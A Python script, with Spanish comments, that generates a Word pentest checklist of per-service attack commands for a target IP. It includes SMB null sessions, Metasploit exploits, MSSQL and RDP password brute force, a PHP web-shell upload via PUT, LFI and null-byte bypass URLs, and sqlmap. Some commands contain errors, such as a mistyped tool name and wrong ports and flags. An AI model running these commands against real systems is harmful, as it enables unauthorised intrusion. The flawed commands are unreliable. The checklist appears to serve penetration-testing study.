import os
from docx import Document
from docx.shared import RGBColor
# Imports propios
import sistema.operaciones as oper
import classes.servicio as srv

def addTextCommand(document,cmd):
    run = document.add_paragraph().add_run(cmd)
    font = run.font
    # Color verde para la consola
    font.color.rgb = RGBColor(0x00,0x99,0x33)
    return

# Método para añadir los resultado de un escaneo NMAP en base a los servicios recibidos
def addNmapResults(document,servicios):
    
    # Creamos la tabla
    table = document.add_table(rows=1, cols=4)
    table.style = "Medium Shading 2 Accent 2"
    # Creamos cabecera de la tabla
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Servicio'
    hdr_cells[1].text = 'Puerto'
    hdr_cells[2].text = 'Versión'
    hdr_cells[3].text = 'Estado'
    # Recorremos los servicios y vamos añadiéndolos
    for nombre, servicio in servicios.items():
        filaNombre = table.add_row().cells
        filaNombre[0].text = nombre
        # Recorremos la información para las veces que se ha encontrado ese servicio
        for puerto,version,estado in zip(servicio.puertos,servicio.versiones,servicio.estados):
            row_cells = table.add_row().cells
            row_cells[1].text = puerto
            row_cells[2].text = version
            row_cells[3].text = estado

    document.add_page_break()
    return

# Añade una lista en negrita con un texto
def addListBullet(document,value):
    document.add_paragraph(style='List Bullet').add_run(value).bold = True
    return

def addRecon(document,ip,folder):
    scanFolder = folder + "/recon"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('Reconomiento', level=1)
    # Lista + comando
    addListBullet(document,'Syn-scan')
    addTextCommand(document,"nmap -sS %s -oN '%s/%s_syn-scan.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'Service-version, default scripts, OS')
    addTextCommand(document,"nmap %s -sV -sC -O -oN '%s/%s_versiones.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'Escaneo de todos los puertos (intenso)')
    addTextCommand(document,"nmap %s -sV -sC -O -oN '%s/%s_all_ports.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'Escaneo UDP')
    addTextCommand(document,"nmap %s -sU -oN '%s/%s_UDP.nmap'" % (ip,scanFolder,ip))
    addTextCommand(document,"unicornscan -mU -v -I %s > '%s/%s_unicorn_scan.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'Conexión a puerto UDP (si es posible)')
    addTextCommand(document,"nc -u %s 48772" % (ip))
    addListBullet(document,'Super Escaneo (muy intenso)')
    addTextCommand(document,"nmap %s -p- -A -T4 -sC -oN '%s/%s_UDP.nmap'" % (ip,scanFolder,ip))
    return

def addFtp(document,ip,folder):
    scanFolder = folder + "/ftp"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('FTP (21)', level=1)
    addListBullet(document,'NMap FTP Scripts')
    addTextCommand(document,"nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 %s -oN '%s/%s_ftp-scan.nmap'" % (ip,scanFolder,ip))
    return

def addSmtp(document,ip,folder):
    scanFolder = folder + "/smtp"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('SMTP (25)', level=1)
    # Lista + comando
    addListBullet(document,'Ncat')
    addTextCommand(document,"nc -nvv %s 25" % (ip))
    addTextCommand(document,"HELO foo<cr><lf>")
    addListBullet(document,'NMap SMTP Scripts')
    addTextCommand(document,"nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 %s -oN '%s/%s_smtp-scan.nmap'" % (ip,scanFolder,ip))
    return

def addMsRPC(document,ip,folder):
    scanFolder = folder + "/msrpc"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('MSRPC (135)', level=1)
    # Lista + comando
    addListBullet(document,'NMap MSRPC script')
    addTextCommand(document,"nmap %s --script=msrpc-enum -oN '%s/%s_msrpc-scan.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'Exploit')
    addTextCommand(document,"msf > use exploit/windows/dcerpc/ms03_026_dcom")

def addRpcbind(document,ip,folder):
    scanFolder = folder + "/rpcbind"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('RpcBind (135) (Linux)', level=1)
    # Lista + comando
    addListBullet(document,'rpcinfo')
    addTextCommand(document,"Revisar ficheros NMAP que lo hace automáticamente")
    return

def addSmb(document,ip,folder):
    scanFolder = folder + "/smb"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('SMB (139/445)', level=1)
    # Lista + comando
    addListBullet(document,'NMap SMB script')
    addTextCommand(document,"nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse %s -p 445 -oN '%s/%s_smb-scan.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'enum4linux')
    addTextCommand(document,"enum4linux -a %s > '%s/%s_enum4linux-scan.txt'" % (ip,scanFolder,ip))
    addListBullet(document,'rpcclient (Windows)')
    addTextCommand(document,"rpcclient -U "" %s" % (ip))
    addTextCommand(document,"       srvinfo")
    addTextCommand(document,"       enumdomusers")
    addTextCommand(document,"       getdompwinfo")
    addTextCommand(document,"       querydominfo")
    addTextCommand(document,"       netshareenum")
    addTextCommand(document,"       netshareenumall")
    addListBullet(document,'smbclient')
    addTextCommand(document,"smbclient -L "" %s" % (ip))
    addTextCommand(document,"smbclient //%s/tmp" % (ip))
    addTextCommand(document,"smbclient \\\\%s\\ipc$ -U john" % (ip))
    addTextCommand(document,"smbclient //%s/ipc$ -U john" % (ip))
    addTextCommand(document,"smbclient //%s/admin$ -U john" % (ip))
    addListBullet(document,'WINDOWS - Log in con shell (winexex)')
    addTextCommand(document,"winexe -U username //%s ""cmd.exe"" --system" % (ip))
    return

def addSnmp(document,ip,folder):
    scanFolder = folder + "/snmp"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('SNMP (UDP 161/162)', level=1)
    # Lista + comando
    addListBullet(document,'NMap SNMP script')
    addTextCommand(document,"nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes %s -oN '%s/%s_snmp-scan.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'snmp-check')
    addTextCommand(document,"snmp-check %s -c public" % (ip))
    addTextCommand(document,"snmp-check %s -c private" % (ip))
    addTextCommand(document,"snmp-check %s -c community" % (ip))
    return

def addMssql(document,ip,folder):
    scanFolder = folder + "/mssql"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('MSSQL (1433)', level=1)
    # Lista + comando
    addListBullet(document,'Metasploit mssql_ping')
    addTextCommand(document,"use auxiliary/scanner/mssql/mssql_ping")
    addTextCommand(document,"set RHOSTS %s" % (ip))
    addTextCommand(document,"set THREADS 5")
    addTextCommand(document,"run")
    addListBullet(document,'Metasploit mssql_login')
    addTextCommand(document,"use scanner/mssql/mssql_login")
    addTextCommand(document,"set PASS_FILE /usr/share/set/src/fasttrack/wordlist.txt")
    addTextCommand(document,"set RHOSTS %s" % (ip))
    addTextCommand(document,"set THREADS 5")
    addTextCommand(document,"exploit")
    addListBullet(document,'xp_cmdshell (Con acceso, para ejecutar comandos)')
    addTextCommand(document,"xp_cmdshell 'date'")
    addTextCommand(document,"go")
    addListBullet(document,'Si se tienen credenciales, revisar más módulos de metasploit')
    addTextCommand(document,"search mssql")
    return

def addOracle(document,ip,folder):
    scanFolder = folder + "/oracle"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('Oracle (1521)', level=1)
    # Lista + comando
    addListBullet(document,'tnscmd10g')
    addTextCommand(document,"tnscmd10g version -h %s > '%s/%s_tnscmd10g-version.txt'" % (ip,scanFolder,ip))
    addTextCommand(document,"tnscmd10g status -h %s > '%s/%s_tnscmd10g-status.txt'" % (ip,scanFolder,ip))
    return

def addNfs(document,ip,folder):
    scanFolder = folder + "/nfs"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('NFS (2049)', level=1)
    # Lista + comando
    addListBullet(document,'Nmap NFS script')
    addTextCommand(document,"nmap -sV --script=nfs-showmount %s -oN '%s/%s_nfs-scan.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'Mount (si Nmap devolvió rutas para montar)')
    addTextCommand(document,"mount %s:/ /tmp/NFS" % (ip))
    addTextCommand(document,"mount -t %s:/ /tmp/NFS" % (ip))
    return

def addMysql(document,ip,folder):
    scanFolder = folder + "/mysql"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('MySQL (3306)', level=1)
    # Lista + comando
    addListBullet(document,'MySQL (Conexión)')
    addTextCommand(document,"mysql --host=%s -u root -p" % (ip))
    addListBullet(document,'Nmap MySQL script')
    addTextCommand(document,"nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 %s -p 3306 -oN '%s/%s_mysql-scan.nmap'" % (ip,scanFolder,ip))
    return

def addRemoteDesktop(document,ip,folder):
    scanFolder = folder + "/remotedesktop"
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('Remote Desktop (3389) (Windows)', level=1)
    # Lista + comando
    addListBullet(document,'rdesktop (averiguar OS)')
    addTextCommand(document,"rdesktop -u guest -p guest %s -g 94%s" % (ip,'%'))
    addListBullet(document,'ncrack (pass por brute force)')
    # OJO QUE NO EXISTEN LOS PASSWORDS!
    addTextCommand(document,"rncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://%s" % (ip))

def addHttp(document,ip,folder,puerto):
    scanFolder = folder + "/http_" + puerto
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('Puerto HTTP (%s)' % (puerto), level=1)
    # Lista + comando
    addListBullet(document,'Nikto y Nikto con squid proxy')
    addTextCommand(document,"nikto -h http://%s:%s" % (ip,puerto))
    addTextCommand(document,"nikto -h %s:%s -useproxy http://%s:4444" % (ip,puerto,ip))
    addListBullet(document,'Curl Header')
    addTextCommand(document,"curl -i %s:%s" % (ip,puerto))
    addListBullet(document,'Curl Everything')
    addTextCommand(document,"curl -i -L %s:%s" % (ip,puerto))
    addListBullet(document,'Curl Intento de upload con PUT')
    addTextCommand(document,"curl -v -X OPTIONS http://%s:%s/" % (ip,puerto))
    addTextCommand(document,"curl -v -X PUT -d '<?php system($_GET[""cmd""]); ?>' http://%s:%s/test/shell.php" % (ip,puerto))
    addListBullet(document,'dotdotpwn.pl (para título y all links)')
    addTextCommand(document,"dotdotpwn.pl -m http -h %s -M GET -o unix > '%s/%s_dotdotpwn-unix-scan.nmap'" % (ip,scanFolder,ip))
    addTextCommand(document,"dotdotpwn.pl -m http -h %s -M GET -o windows > '%s/%s_dotdotpwn-windows-scan.nmap'" % (ip,scanFolder,ip))
    addTextCommand(document,"dotdotpwn.pl -m http -h %s -M GET -o generic > '%s/%s_dotdotpwn-generic-scan.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'Dirb')
    addTextCommand(document,"dirb http://%s:%s -r -o '%s/%s_dirb-scan.nmap'" % (ip,puerto,scanFolder,ip))
    addListBullet(document,'GoBuster (No viene por defecto en Kali')
    addTextCommand(document,"gobuster -u http://%s:%s -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e > '%s/%s_gobuster-scan.nmap'" % (ip,puerto,scanFolder,ip))
    addListBullet(document,'Kadimus (PHP) (No viene por defecto en Kali)')
    addTextCommand(document,"/root/Tools/Kadimus/kadimus -u http://%s:%s/example.php?page= -o '%s/%s_kadimus-scan.nmap'" % (ip,puerto,scanFolder,ip))
    addListBullet(document,'Bypass Execution (PHP)')
    addTextCommand(document,"http://%s:%s/index.php?page=php://filter/convert.base64-encode/resource=index" % (ip,puerto))
    addTextCommand(document,"base64 -d FICHERODESCARGADO.php")
    addListBullet(document,'Bypass Extension')
    addTextCommand(document,"http://%s:%s/page=http://localhost/maliciousfile.txt%s" % (ip,puerto,'%00'))
    addTextCommand(document,"http://%s:%s/page=http://localhost/maliciousfile.txt?" % (ip,puerto))
    addListBullet(document,'SQLmap Post')
    addTextCommand(document,"sqlmap -r REQUEST_FILE -p tfUPass")
    addListBullet(document,'SQLmap Get')
    addTextCommand(document,"sqlmap -u 'http://%s:%s/index.php?id=1' --dbms=mysql" % (ip,puerto))
    addListBullet(document,'SQLmap Crawl')
    addTextCommand(document,"sqlmap -u 'http://%s:%s' --dbms=mysql --crawl=3" % (ip,puerto))
    return

def addHttps(document,ip,folder,puerto):
    scanFolder = folder + "/https_" + puerto
    # Creamos directorio si no existe
    oper.createFolder(scanFolder)
    # Cabecera
    document.add_heading('Puerto HTTPS (%s)' % (puerto), level=1)
    # Lista + comando
    addListBullet(document,'Nikto y Nikto con squid proxy')
    addTextCommand(document,"nikto -h https://%s:%s" % (ip,puerto))
    addTextCommand(document,"nikto -h %s:%s -useproxy https://%s:4444" % (ip,puerto,ip))
    addListBullet(document,'Curl Header')
    addTextCommand(document,"curl -i %s:%s" % (ip,puerto))
    addListBullet(document,'Curl Everything')
    addTextCommand(document,"curl -i -L %s:%s" % (ip,puerto))
    addListBullet(document,'Curl Intento de upload con PUT')
    addTextCommand(document,"curl -v -X OPTIONS https://%s:%s/" % (ip,puerto))
    addTextCommand(document,"curl -v -X PUT -d '<?php system($_GET[""cmd""]); ?>' https://%s:%s/test/shell.php" % (ip,puerto))
    addListBullet(document,'dotdotpwn.pl (para título y all links)')
    addTextCommand(document,"dotdotpwn.pl -m https -h %s -M GET -o unix > '%s/%s_dotdotpwn-unix-scan.nmap'" % (ip,scanFolder,ip))
    addTextCommand(document,"dotdotpwn.pl -m https -h %s -M GET -o windows > '%s/%s_dotdotpwn-windows-scan.nmap'" % (ip,scanFolder,ip))
    addTextCommand(document,"dotdotpwn.pl -m https -h %s -M GET -o generic > '%s/%s_dotdotpwn-generic-scan.nmap'" % (ip,scanFolder,ip))
    addListBullet(document,'Dirb')
    addTextCommand(document,"dirb https://%s:%s -r -o '%s/%s_dirb-scan.nmap'" % (ip,puerto,scanFolder,ip))
    addListBullet(document,'GoBuster (No viene por defecto en Kali')
    addTextCommand(document,"gobuster -u https://%s:%s -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e > '%s/%s_gobuster-scan.nmap'" % (ip,puerto,scanFolder,ip))
    addListBullet(document,'Kadimus (PHP) (No viene por defecto en Kali)')
    addTextCommand(document,"/root/Tools/Kadimus/kadimus -u https://%s:%s/example.php?page= -o '%s/%s_kadimus-scan.nmap'" % (ip,puerto,scanFolder,ip))
    addListBullet(document,'Bypass Execution (PHP)')
    addTextCommand(document,"https://%s:%s/index.php?page=php://filter/convert.base64-encode/resource=index" % (ip,puerto))
    addTextCommand(document,"base64 -d FICHERODESCARGADO.php")
    addListBullet(document,'Bypass Extension')
    addTextCommand(document,"https://%s:%s/page=http://localhost/maliciousfile.txt%s" % (ip,puerto,'%00'))
    addTextCommand(document,"https://%s:%s/page=http://localhost/maliciousfile.txt?" % (ip,puerto))
    addListBullet(document,'SQLmap Post')
    addTextCommand(document,"sqlmap -r REQUEST_FILE -p tfUPass")
    addListBullet(document,'SQLmap Get')
    addTextCommand(document,"sqlmap -u 'https://%s:%s/index.php?id=1' --dbms=mysql" % (ip,puerto))
    addListBullet(document,'SQLmap Crawl')
    addTextCommand(document,"sqlmap -u 'https://%s:%s' --dbms=mysql --crawl=3" % (ip,puerto))
    addListBullet(document,'Heartbleed')
    addTextCommand(document,"sslscan %s:443" % (ip))
    return


